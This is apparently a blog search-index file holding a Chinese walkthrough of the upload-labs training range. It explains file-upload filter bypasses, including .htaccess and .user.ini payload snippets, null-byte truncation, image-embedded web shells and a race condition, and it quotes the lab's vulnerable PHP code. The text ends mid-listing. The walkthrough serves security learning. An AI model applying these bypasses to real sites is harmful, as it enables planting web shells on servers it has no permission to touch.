<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>upload_labs</title>
    <link href="/2025/07/19/upload-labs/"/>
    <url>/2025/07/19/upload-labs/</url>
    
    <content type="html"><![CDATA[<h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p>尝试上传test.php，弹出提示信息</p><p><img src="/2025/07/19/upload-labs/pass_01_1.png"></p><p>发现页面并没有刷新，应该是客户端检测（查看网页源码就能发现这里是客户端检测）</p><p>禁用js，再次上传，成功上传，尝试命令执行</p><p><img src="/2025/07/19/upload-labs/pass_01_2.png"></p><p>也可将文件后缀改为jpg，用bp抓包后将文件后缀改回php</p><h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p>尝试上传test.php，弹出提示信息</p><p><img src="/2025/07/19/upload-labs/pass_02_1.png"></p><p>发现页面有刷新，应该是服务端检测（查看网页源码能发现客户端并没有相关js代码进行文件检测）</p><p>将文件后缀改为jpg，再次上传，上传成功，说明服务端进行的是一个MIME类型检测（或则后缀检测）</p><p>bp抓包将Content-Type字段修改为：text&#x2F;html，在重放器中查看响应</p><p><img src="/2025/07/19/upload-labs/pass_02_2.png"></p><p>上传失败，确定是MIME类型检测，将文件后缀改为php，Content-Type字段改为：image&#x2F;jpeg，再次上传</p><p><img src="/2025/07/19/upload-labs/pass_02_3.png"></p><p>上传成功，尝试命令执行</p><p><img src="/2025/07/19/upload-labs/pass_02_4.png"></p><h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><p>尝试上传test.php，弹出提示信息</p><p><img src="/2025/07/19/upload-labs/pass_03_1.png"></p><p>显然是黑名单的文件后缀检测</p><p>尝试了后缀双写绕过、.htaccess配置文件绕过，::$DATA绕过，其他可能解析绕过均以失败告终</p><p>看一下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;.asp&#x27;</span>,<span class="hljs-string">&#x27;.aspx&#x27;</span>,<span class="hljs-string">&#x27;.php&#x27;</span>,<span class="hljs-string">&#x27;.jsp&#x27;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//收尾去空</span><br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;            <br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>)) &#123;<br>                 <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>尝试的绕过方式未成功的原因是：对于存在于黑名单中的后缀只做检查而不替换为空，给上传成功的文件一个随机文件名，将::$DATA替换为空</p><p>可以通过双写::$DATA进行绕过（&amp; _ &amp;），成功上传</p><p>右键新标签页打开图像</p><p><img src="/2025/07/19/upload-labs/pass_03_2.png"></p><p>将末尾的::$DATA删除后再访问，访问成功，尝试进行命令执行</p><p><img src="/2025/07/19/upload-labs/pass_03_3.png"></p><p>其他可能解析绕过失败的原因是Apache的httpd-conf配置文件中的“#AddType application&#x2F;x-httpd-php .php .phtml”被注释，将前面的#去掉，就能够将.phtml于php解析器关联起来即phtml文件可以被当作php文件进行解析</p><p>将注释符删除后，上传phtml文件，尝试进行命令执行</p><p><img src="/2025/07/19/upload-labs/pass_03_4.png"></p><h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p>尝试上传test.php，弹出提示信息</p><p><img src="/2025/07/19/upload-labs/pass_04_1.png"></p><p>尝试上传test.jpg，上传成功</p><p>尝试上传test.aaa，上传成功</p><p><img src="/2025/07/19/upload-labs/pass_04_2.png"></p><p>应该也是一个黑名单的文件后缀检测，且发现并没有修改上传的文件名</p><p>尝试上传.htaccess配置文件</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;test.jpg&quot;</span>&gt;</span><br><span class="hljs-attribute">setHandler</span> application/x-httpd-php<br><span class="hljs-section">&lt;/FilesMatch&gt;</span><br></code></pre></td></tr></table></figure><p>再上传test.jpg，上传成功后，尝试命令执行</p><p><img src="/2025/07/19/upload-labs/pass_04_3.png"></p><h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p>尝试上传test.php，弹出提示信息</p><p><img src="/2025/07/19/upload-labs/pass_05_1.png"></p><p>尝试上传test.jpg，上传成功</p><p>尝试上传test.aaa，上传成功</p><p>应该也是一个黑名单的文件后缀检测，且发现并没有修改上传的文件名</p><p>尝试上传.htaccess配置文件，上传失败</p><p>尝试进行后缀双写，::$DATA及双写，其他可能解析绕过均失败</p><p>查看源码，也没有什么发现，查看提示</p><p><img src="/2025/07/19/upload-labs/pass_05_2.png"></p><p>可以利用.user.ini将文件马包含到readme.php中</p><p>我在这使用的环境是</p><p><img src="/2025/07/19/upload-labs/pass_05_4.png"></p><p>先上传.user.ini</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">auto_prepend_file</span>=test.jpg<br></code></pre></td></tr></table></figure><p>再上传test.jpg，上传成功，尝试命令执行</p><p><img src="/2025/07/19/upload-labs/pass_05_3.png"></p><p>这一个pass还可以利用Apache陌生后缀解析绕过</p><blockquote><p>Apache默认一个文件可以有多个拓展名。判断文件拓展名的规则是从右往左开始判断，如果为不可解析的后缀名就会从左往右判断</p></blockquote><p>上传test.php.aaa，上传成功，新标签页打开图像，将url中的aaa文件后缀去除后尝试命令执行</p><p><img src="/2025/07/19/upload-labs/pass_05_5.png"></p><h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><p>尝试上传test.php，弹出提示信息</p><p><img src="/2025/07/19/upload-labs/pass_06_1.png"></p><p>尝试上传test.jpg，上传成功</p><p>尝试上传test.aaa，上传成功</p><p>应该也是一个黑名单的文件后缀检测，且发现给了一个随机的文件名，不能利用配置文件绕过</p><p>尝试大小写绕过，上传test.pHP，上传成功，尝试命令执行</p><p><img src="/2025/07/19/upload-labs/pass_06_2.png"></p><h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><p>尝试上传test.php，弹出提示信息</p><p><img src="/2025/07/19/upload-labs/pass_07_1.png"></p><p>尝试上传test.jpg，上传成功</p><p>尝试上传test.aaa，上传成功</p><p>应该也是一个黑名单的文件后缀检测，且发现给了一个随机的文件名，不能利用配置文件绕过</p><p>尝试双写::$DATA，上传成功，尝试命令执行</p><p><img src="/2025/07/19/upload-labs/pass_07_2.png"></p><p>看一下源码，发现并没有进行首尾去空的操作，也可以在文件后缀后加空格进行绕过</p><h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><p>尝试上传test.php，弹出提示信息</p><p><img src="/2025/07/19/upload-labs/pass_08_1.png"></p><p>尝试上传test.jpg，上传成功</p><p>尝试上传test.aaa，上传成功</p><p>应该也是一个黑名单的文件后缀检测，发现并没有修改文件名，尝试利用配置文件绕过，上传失败</p><p>尝试利用点绕过，上传成功，尝试命令执行</p><p><img src="/2025/07/19/upload-labs/pass_08_2.png"></p><h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><p>尝试上传test.php，弹出提示信息</p><p><img src="/2025/07/19/upload-labs/pass_09_1.png"></p><p>尝试上传test.jpg，上传成功</p><p>尝试上传test.aaa，上传成功</p><p>应该也是一个黑名单的文件后缀检测，且发现给了一个随机的文件名，不能利用配置文件绕过</p><p>尝试::$DATA绕过，上传成功，尝试命令执行</p><p><img src="/2025/07/19/upload-labs/pass_09_2.png"></p><h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><p>尝试上传test.php，弹出提示信息</p><p><img src="/2025/07/19/upload-labs/pass_10_1.png"></p><p>尝试上传test.jpg，上传成功</p><p>尝试上传test.aaa，上传成功</p><p>应该也是一个黑名单的文件后缀检测，发现并没有修改文件名，尝试利用配置文件绕过，上传失败</p><p>尝试点空格点绕过，上传成功，尝试命令执行</p><p><img src="/2025/07/19/upload-labs/pass_10_2.png"></p><h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><p>尝试上传test.php，上传成功，新标签页打开图像，发现php被替换为空</p><p><img src="/2025/07/19/upload-labs/pass_11_1.png"></p><p>php双写绕过，上传成功，尝试命令执行</p><p><img src="/2025/07/19/upload-labs/pass_11_2.png"></p><h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><p>尝试上传test.php，弹出提示信息</p><p><img src="/2025/07/19/upload-labs/pass_12_1.png"></p><p>显然是白名单的文件后缀检测，bp抓包发现以get的方式提交了一个save_path</p><p>采用00截断中的%00截断</p><p><img src="/2025/07/19/upload-labs/pass_12_2.png"></p><p>上传成功尝试命令执行</p><p><img src="/2025/07/19/upload-labs/pass_12_3.png"></p><p>00截断利用条件</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">php</span>：php&lt;<span class="hljs-number">5</span>.<span class="hljs-number">3</span>.<span class="hljs-number">29</span>且magic_qutoes_gpc=<span class="hljs-literal">Off</span><br></code></pre></td></tr></table></figure><p>这里我用的php版本是</p><p><img src="/2025/07/19/upload-labs/pass_12_4.png"></p><p>magic_qutoes_gpc需要在php.ini配置文件中修改</p><h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><p>尝试上传test.php，弹出提示信息</p><p><img src="/2025/07/19/upload-labs/pass_13_1.png"></p><p>显然是白名单的文件后缀检测，bp抓包发现以post的方式提交了一个save_path</p><p>采用00截断中的0x00截断</p><p><img src="/2025/07/19/upload-labs/pass_13_2.png"></p><p>放包后上传成功，尝试命令执行</p><p><img src="/2025/07/19/upload-labs/pass_13_3.png"></p><h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><p>利用十六进制编辑器，在图片末尾插入一句话木马</p><p><img src="/2025/07/19/upload-labs/pass_14_1.png"></p><p>然后上传，上传成功后，新标签页打开图像拿到文件路径</p><p>进行文件包含</p><p><img src="/2025/07/19/upload-labs/pass_14_2.png"></p><p>看一下源码，只检查文件的前两个字节，可以利用php文件+头字节进行绕过</p><p>利用gif的文件幻数可以直接在php文件中加如GIF89a，如果要利用png的文件幻数就将一句话木马前的十六进制值改为8950</p><h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><p>可以直接用pass14的文件马</p><p><img src="/2025/07/19/upload-labs/pass_15_1.png"></p><p>看一下源码，利用getimagesize检查是否为图片</p><blockquote><p>getimagesize() 是 PHP 内置函数，用于获取图像文件的尺寸、类型和 MIME 信息</p></blockquote><h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><p>需要开启php_exif模块</p><p><img src="/2025/07/19/upload-labs/pass_16_1.png"></p><blockquote><p>exif_imagetype() 是 PHP 中用于检测图像文件类型的内置函数，与 getimagesize() 类似，但更轻量。它通过读取文件的前几个字节（文件头）来判断图像类型</p></blockquote><p>可以直接用pass14的文件马</p><h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><p>对上传的图片进行二次渲染</p><p>先上传一个图片，上传成功后再将渲染后的图片保存到本地</p><p>用十六进制编辑器打开，寻找hex值不变的地方，</p><p><img src="/2025/07/19/upload-labs/pass_17_1.png"></p><p>插入一句话木马后上传，上传失败</p><p>我用的是gif绕过二次渲染的处理方式，但上传的是jpg，png与jpg绕过二次渲染的方式较gif更加复杂(<a href="https://www.cnblogs.com/1ink/p/15115240.html">pass-16 二次渲染绕过</a>)</p><p>找了一个现成的gif木马</p><p><img src="/2025/07/19/upload-labs/pass_17_2.png"></p><h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h2><p>代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$file_name</span>,<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$file_name</span>,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$upload_file</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$file_name</span>;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$upload_file</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;<br>             <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span>. <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br>             <span class="hljs-title function_ invoke__">rename</span>(<span class="hljs-variable">$upload_file</span>, <span class="hljs-variable">$img_path</span>);<br>             <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;<br>            <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$upload_file</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>白名单的文件后缀检测，将临时文件上传到路径后再判断文件拓展名是否在白名单中，如果在白名单中，就重命名上传的临时文件</p><p>尝试条件竞争，bp抓包添加了一个无关紧要的参数来控制爆破次数</p><p><img src="/2025/07/19/upload-labs/pass_18_1.png"></p><p>尝试进行命令执行</p><p><img src="/2025/07/19/upload-labs/pass_18_2.png"></p><h2 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h2><p>代码审计</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))<br>&#123;<br>    <span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;./myupload.php&quot;</span>);<br>    <span class="hljs-variable">$imgFileName</span> =<span class="hljs-title function_ invoke__">time</span>();<br>    <span class="hljs-variable">$u</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyUpload</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>], <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>],<span class="hljs-variable">$imgFileName</span>);<br>    <span class="hljs-variable">$status_code</span> = <span class="hljs-variable">$u</span>-&gt;<span class="hljs-title function_ invoke__">upload</span>(UPLOAD_PATH);<br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$status_code</span>) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$u</span>-&gt;cls_upload_dir . <span class="hljs-variable">$u</span>-&gt;cls_file_rename_to;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;文件已经被上传，但没有重命名。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> -<span class="hljs-number">1</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> -<span class="hljs-number">2</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传失败，上传目录不可写。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> -<span class="hljs-number">3</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传失败，无法上传该类型文件。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> -<span class="hljs-number">4</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传失败，上传的文件过大。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> -<span class="hljs-number">5</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传失败，服务器已经存在相同名称文件。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> -<span class="hljs-number">6</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;文件无法上传，文件不能复制到目标目录。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;      <br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;未知错误！&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>myupload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyUpload</span></span>&#123;    <br><br>  <span class="hljs-keyword">var</span> <span class="hljs-variable">$cls_upload_dir</span> = <span class="hljs-string">&quot;&quot;</span>;         <span class="hljs-comment">// Directory to upload to.</span><br><span class="hljs-keyword">var</span> <span class="hljs-variable">$cls_filename</span> = <span class="hljs-string">&quot;&quot;</span>;           <span class="hljs-comment">// Name of the upload file.</span><br><span class="hljs-keyword">var</span> <span class="hljs-variable">$cls_tmp_filename</span> = <span class="hljs-string">&quot;&quot;</span>;       <span class="hljs-comment">// TMP file Name (tmp name by php).</span><br>  <span class="hljs-keyword">var</span> <span class="hljs-variable">$cls_max_filesize</span> = <span class="hljs-number">33554432</span>; <span class="hljs-comment">// Max file size.</span><br>  <span class="hljs-keyword">var</span> <span class="hljs-variable">$cls_filesize</span> =<span class="hljs-string">&quot;&quot;</span>;            <span class="hljs-comment">// Actual file size.</span><br>  <span class="hljs-keyword">var</span> <span 